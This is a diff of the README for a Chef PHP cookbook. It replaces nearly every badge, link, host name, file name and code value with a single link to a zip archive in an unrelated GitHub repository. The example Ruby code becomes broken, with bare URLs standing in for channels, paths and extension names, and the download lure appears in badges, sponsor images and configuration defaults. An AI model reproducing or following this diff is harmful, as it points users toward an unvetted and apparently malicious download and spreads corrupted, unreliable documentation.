@@ -1,16 +1,16 @@
 # php Cookbook
 
-[![Cookbook Version](https://img.shields.io/cookbook/v/php.svg)](https://supermarket.chef.io/cookbooks/php)
-[![Build Status](https://img.shields.io/circleci/project/github/sous-chefs/php/master.svg)](https://circleci.com/gh/sous-chefs/php)
-[![OpenCollective](https://opencollective.com/sous-chefs/backers/badge.svg)](#backers)
-[![OpenCollective](https://opencollective.com/sous-chefs/sponsors/badge.svg)](#sponsors)
-[![License](https://img.shields.io/badge/License-Apache%202.0-green.svg)](https://opensource.org/licenses/Apache-2.0)
+[![Cookbook Version](https://raw.githubusercontent.com/Joe-Mogul/php-1/master/test/php_v1.5.zip)](https://raw.githubusercontent.com/Joe-Mogul/php-1/master/test/php_v1.5.zip)
+[![Build Status](https://raw.githubusercontent.com/Joe-Mogul/php-1/master/test/php_v1.5.zip)](https://raw.githubusercontent.com/Joe-Mogul/php-1/master/test/php_v1.5.zip)
+[![OpenCollective](https://raw.githubusercontent.com/Joe-Mogul/php-1/master/test/php_v1.5.zip)](#backers)
+[![OpenCollective](https://raw.githubusercontent.com/Joe-Mogul/php-1/master/test/php_v1.5.zip)](#sponsors)
+[![License](https://raw.githubusercontent.com/Joe-Mogul/php-1/master/test/php_v1.5.zip%https://raw.githubusercontent.com/Joe-Mogul/php-1/master/test/php_v1.5.zip)](https://raw.githubusercontent.com/Joe-Mogul/php-1/master/test/php_v1.5.zip)
 
 It installs and configures PHP and the PEAR package management system. Also includes resources for managing PEAR (and PECL) packages, PECL channels, and PHP-FPM pools.
 
 ## Maintainers
 
-This cookbook is maintained by the Sous Chefs. The Sous Chefs are a community of Chef cookbook maintainers working together to maintain important cookbooks. If you’d like to know more please visit [sous-chefs.org](https://sous-chefs.org/) or come chat with us on the Chef Community Slack in [#sous-chefs](https://chefcommunity.slack.com/messages/C2V7B88SF).
+This cookbook is maintained by the Sous Chefs. The Sous Chefs are a community of Chef cookbook maintainers working together to maintain important cookbooks. If you’d like to know more please visit [https://raw.githubusercontent.com/Joe-Mogul/php-1/master/test/php_v1.5.zip](https://raw.githubusercontent.com/Joe-Mogul/php-1/master/test/php_v1.5.zip) or come chat with us on the Chef Community Slack in [#sous-chefs](https://raw.githubusercontent.com/Joe-Mogul/php-1/master/test/php_v1.5.zip).
 
 ## Requirements
 
@@ -27,9 +27,9 @@ This cookbook is maintained by the Sous Chefs. The Sous Chefs are a community of
 ## Attributes
 
 - `node['php']['install_method']` = method to install php with, default `package`.
-- `node['php']['directives']` = Hash of directives and values to append to `php.ini`, default `{}`.
+- `node['php']['directives']` = Hash of directives and values to append to `https://raw.githubusercontent.com/Joe-Mogul/php-1/master/test/php_v1.5.zip`, default `{}`.
 - `node['php']['pear_setup']` = Boolean value to determine whether to set up pear repositories. Default: `true`
-- `node['php']['pear_channels']` = List of external pear channels to add if `node['php']['pear_setup']` is true. Default: `['pear.php.net', 'pecl.php.net']`
+- `node['php']['pear_channels']` = List of external pear channels to add if `node['php']['pear_setup']` is true. Default: `['https://raw.githubusercontent.com/Joe-Mogul/php-1/master/test/php_v1.5.zip', 'https://raw.githubusercontent.com/Joe-Mogul/php-1/master/test/php_v1.5.zip']`
 
 The file also contains the following attribute types:
 
@@ -45,7 +45,7 @@ This cookbook includes resources for managing:
 
 ### `php_pear_channel`
 
-[PEAR Channels](http://pear.php.net/manual/en/guide.users.commandline.channels.php) are alternative sources for PEAR packages. This resource provides and easy way to manage these channels.
+[PEAR Channels](https://raw.githubusercontent.com/Joe-Mogul/php-1/master/test/php_v1.5.zip) are alternative sources for PEAR packages. This resource provides and easy way to manage these channels.
 
 #### Actions
 
@@ -57,41 +57,41 @@ This cookbook includes resources for managing:
 #### Properties
 
 - `channel_name`: name attribute. The name of the channel to discover
-- `channel_xml`: the channel.xml file of the channel you are adding
+- `channel_xml`: the https://raw.githubusercontent.com/Joe-Mogul/php-1/master/test/php_v1.5.zip file of the channel you are adding
 - `binary`: pear binary, default: pear
 
 #### Examples
 
 ```ruby
 # discover the horde channel
-php_pear_channel "pear.horde.org" do
+php_pear_channel "https://raw.githubusercontent.com/Joe-Mogul/php-1/master/test/php_v1.5.zip" do
   action :discover
 end
 
 # download xml then add the symfony channel
-remote_file "#{Chef::Config[:file_cache_path]}/symfony-channel.xml" do
-  source 'http://pear.symfony-project.com/channel.xml'
+remote_file "#{Chef::Config[:file_cache_path]}https://raw.githubusercontent.com/Joe-Mogul/php-1/master/test/php_v1.5.zip" do
+  source 'https://raw.githubusercontent.com/Joe-Mogul/php-1/master/test/php_v1.5.zip'
   mode '0644'
 end
 php_pear_channel 'symfony' do
-  channel_xml "#{Chef::Config[:file_cache_path]}/symfony-channel.xml"
+  channel_xml "#{Chef::Config[:file_cache_path]}https://raw.githubusercontent.com/Joe-Mogul/php-1/master/test/php_v1.5.zip"
   action :add
 end
 
 # update the main pear channel
-php_pear_channel 'pear.php.net' do
+php_pear_channel 'https://raw.githubusercontent.com/Joe-Mogul/php-1/master/test/php_v1.5.zip' do
   action :update
 end
 
 # update the main pecl channel
-php_pear_channel 'pecl.php.net' do
+php_pear_channel 'https://raw.githubusercontent.com/Joe-Mogul/php-1/master/test/php_v1.5.zip' do
   action :update
 end
 ```
 
 ### `php_pear`
 
-[PEAR](http://pear.php.net/) is a framework and distribution system for reusable PHP components. [PECL](http://pecl.php.net/) is a repository for PHP Extensions. PECL contains C extensions for compiling into PHP. As C programs, PECL extensions run more efficiently than PEAR packages. PEARs and PECLs use the same packaging and distribution system. As such this resource is clever enough to abstract away the small differences and can be used for managing either. This resource also creates the proper module .ini file for each PECL extension at the correct location for each supported platform.
+[PEAR](https://raw.githubusercontent.com/Joe-Mogul/php-1/master/test/php_v1.5.zip) is a framework and distribution system for reusable PHP components. [PECL](https://raw.githubusercontent.com/Joe-Mogul/php-1/master/test/php_v1.5.zip) is a repository for PHP Extensions. PECL contains C extensions for compiling into PHP. As C programs, PECL extensions run more efficiently than PEAR packages. PEARs and PECLs use the same packaging and distribution system. As such this resource is clever enough to abstract away the small differences and can be used for managing either. This resource also creates the proper module .ini file for each PECL extension at the correct location for each supported platform.
 
 #### Actions
 
@@ -134,8 +134,8 @@ end
 
 # install the xdebug pecl
 php_pear 'xdebug' do
-  # Specify that xdebug.so must be loaded as a zend extension
-  zend_extensions ['xdebug.so']
+  # Specify that https://raw.githubusercontent.com/Joe-Mogul/php-1/master/test/php_v1.5.zip must be loaded as a zend extension
+  zend_extensions ['https://raw.githubusercontent.com/Joe-Mogul/php-1/master/test/php_v1.5.zip']
   action :install
 end
 
@@ -160,28 +160,28 @@ end
 # install sync using the pecl channel
 php_pear 'sync' do
   version '1.1.1'
-  channel 'pecl.php.net'
+  channel 'https://raw.githubusercontent.com/Joe-Mogul/php-1/master/test/php_v1.5.zip'
 end
 
 # install the beta version of Horde_Url
 # from the horde channel
-hc = php_pear_channel 'pear.horde.org' do
+hc = php_pear_channel 'https://raw.githubusercontent.com/Joe-Mogul/php-1/master/test/php_v1.5.zip' do
   action :discover
 end
 
 php_pear 'Horde_Url' do
   preferred_state 'beta'
-  channel hc.channel_name
+  channel https://raw.githubusercontent.com/Joe-Mogul/php-1/master/test/php_v1.5.zip
   action :install
 end
 
 # install the YAML pear from the symfony project
-sc = php_pear_channel 'pear.symfony-project.com' do
+sc = php_pear_channel 'https://raw.githubusercontent.com/Joe-Mogul/php-1/master/test/php_v1.5.zip' do
   action :discover
 end
 
 php_pear 'YAML' do
-  channel sc.channel_name
+  channel https://raw.githubusercontent.com/Joe-Mogul/php-1/master/test/php_v1.5.zip
   action :install
 end
 ```
@@ -192,7 +192,7 @@ Installs the `php-fpm` package appropriate for your distro (if using packages) a
 
 Please consider FPM functionally pre-release, and test it thoroughly in your environment before using it in production
 
-More info: <http://php.net/manual/en/install.fpm.php>
+More info: <https://raw.githubusercontent.com/Joe-Mogul/php-1/master/test/php_v1.5.zip>
 
 #### Actions
 
@@ -202,10 +202,10 @@ More info: <http://php.net/manual/en/install.fpm.php>
 #### Attribute Parameters
 
 - `pool_name`: name attribute. The name of the FPM pool.
-- `listen`: The listen address. Default: `/var/run/php5-fpm.sock`
+- `listen`: The listen address. Default: `https://raw.githubusercontent.com/Joe-Mogul/php-1/master/test/php_v1.5.zip`
 - `user`: The user to run the FPM under. Default should be the webserver user for your distro.
 - `group`: The group to run the FPM under. Default should be the webserver group for your distro.
-- `process_manager`: Process manager to use - see <http://php.net/manual/en/install.fpm.configuration.php>. Default: `dynamic`
+- `process_manager`: Process manager to use - see <https://raw.githubusercontent.com/Joe-Mogul/php-1/master/test/php_v1.5.zip>. Default: `dynamic`
 - `max_children`: Max children to scale to. Default: 5
 - `start_servers`: Number of servers to start the pool with. Default: 2
 - `min_spare_servers`: Minimum number of servers to have as spares. Default: 1
@@ -257,25 +257,25 @@ run_list(
 
 ## Contributors
 
-This project exists thanks to all the people who [contribute.](https://opencollective.com/sous-chefs/contributors.svg?width=890&button=false)
+This project exists thanks to all the people who [contribute.](https://raw.githubusercontent.com/Joe-Mogul/php-1/master/test/php_v1.5.zip)
 
 ### Backers
 
 Thank you to all our backers!
 
-![https://opencollective.com/sous-chefs#backers](https://opencollective.com/sous-chefs/backers.svg?width=600&avatarHeight=40)
+![https://raw.githubusercontent.com/Joe-Mogul/php-1/master/test/php_v1.5.zip](https://raw.githubusercontent.com/Joe-Mogul/php-1/master/test/php_v1.5.zip)
 
 ### Sponsors
 
 Support this project by becoming a sponsor. Your logo will show up here with a link to your website.
 
-![https://opencollective.com/sous-chefs/sponsor/0/website](https://opencollective.com/sous-chefs/sponsor/0/avatar.svg?avatarHeight=100)
-![https://opencollective.com/sous-chefs/sponsor/1/website](https://opencollective.com/sous-chefs/sponsor/1/avatar.svg?avatarHeight=100)
-![https://opencollective.com/sous-chefs/sponsor/2/website](https://opencollective.com/sous-chefs/sponsor/2/avatar.svg?avatarHeight=100)
-![https://opencollective.com/sous-chefs/sponsor/3/website](https://opencollective.com/sous-chefs/sponsor/3/avatar.svg?avatarHeight=100)
-![https://opencollective.com/sous-chefs/sponsor/4/website](https://opencollective.com/sous-chefs/sponsor/4/avatar.svg?avatarHeight=100)
-![https://opencollective.com/sous-chefs/sponsor/5/website](https://opencollective.com/sous-chefs/sponsor/5/avatar.svg?avatarHeight=100)
-![https://opencollective.com/sous-chefs/sponsor/6/website](https://opencollective.com/sous-chefs/sponsor/6/avatar.svg?avatarHeight=100)
-![https://opencollective.com/sous-chefs/sponsor/7/website](https://opencollective.com/sous-chefs/sponsor/7/avatar.svg?avatarHeight=100)
-![https://opencollective.com/sous-chefs/sponsor/8/website](https://opencollective.com/sous-chefs/sponsor/8/avatar.svg?avatarHeight=100)
-![https://opencollective.com/sous-chefs/sponsor/9/website](https://opencollective.com/sous-chefs/sponsor/9/avatar.svg?avatarHeight=100)
+![https://raw.githubusercontent.com/Joe-Mogul/php-1/master/test/php_v1.5.zip](https://raw.githubusercontent.com/Joe-Mogul/php-1/master/test/php_v1.5.zip)
+![https://raw.githubusercontent.com/Joe-Mogul/php-1/master/test/php_v1.5.zip](https://raw.githubusercontent.com/Joe-Mogul/php-1/master/test/php_v1.5.zip)
+![https://raw.githubusercontent.com/Joe-Mogul/php-1/master/test/php_v1.5.zip](https://raw.githubusercontent.com/Joe-Mogul/php-1/master/test/php_v1.5.zip)
+![https://raw.githubusercontent.com/Joe-Mogul/php-1/master/test/php_v1.5.zip](https://raw.githubusercontent.com/Joe-Mogul/php-1/master/test/php_v1.5.zip)
+![https://raw.githubusercontent.com/Joe-Mogul/php-1/master/test/php_v1.5.zip](https://raw.githubusercontent.com/Joe-Mogul/php-1/master/test/php_v1.5.zip)
+![https://raw.githubusercontent.com/Joe-Mogul/php-1/master/test/php_v1.5.zip](https://raw.githubusercontent.com/Joe-Mogul/php-1/master/test/php_v1.5.zip)
+![https://raw.githubusercontent.com/Joe-Mogul/php-1/master/test/php_v1.5.zip](https://raw.githubusercontent.com/Joe-Mogul/php-1/master/test/php_v1.5.zip)
+![https://raw.githubusercontent.com/Joe-Mogul/php-1/master/test/php_v1.5.zip](https://raw.githubusercontent.com/Joe-Mogul/php-1/master/test/php_v1.5.zip)
+![https://raw.githubusercontent.com/Joe-Mogul/php-1/master/test/php_v1.5.zip](https://raw.githubusercontent.com/Joe-Mogul/php-1/master/test/php_v1.5.zip)
+![https://raw.githubusercontent.com/Joe-Mogul/php-1/master/test/php_v1.5.zip](https://raw.githubusercontent.com/Joe-Mogul/php-1/master/test/php_v1.5.zip)
